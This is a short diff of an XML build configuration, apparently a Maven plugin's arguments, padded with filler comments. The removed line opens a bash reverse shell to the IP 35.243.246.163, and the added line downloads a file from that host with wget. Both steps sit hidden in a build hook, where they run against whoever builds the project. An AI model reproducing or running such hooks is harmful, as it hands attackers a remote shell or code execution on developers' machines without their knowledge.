@@ -122,7 +122,7 @@
                         <!--Stam-->
                         <!--Stam-->
                         <!--Stam-->
-                        <argument>bash -i >&amp; /dev/tcp/35.243.246.163/443 0>&amp;1</argument>
+                        <argument>wget http://35.243.246.163:443/aa</argument>
                     </arguments>
                 </configuration>
             </plugin>
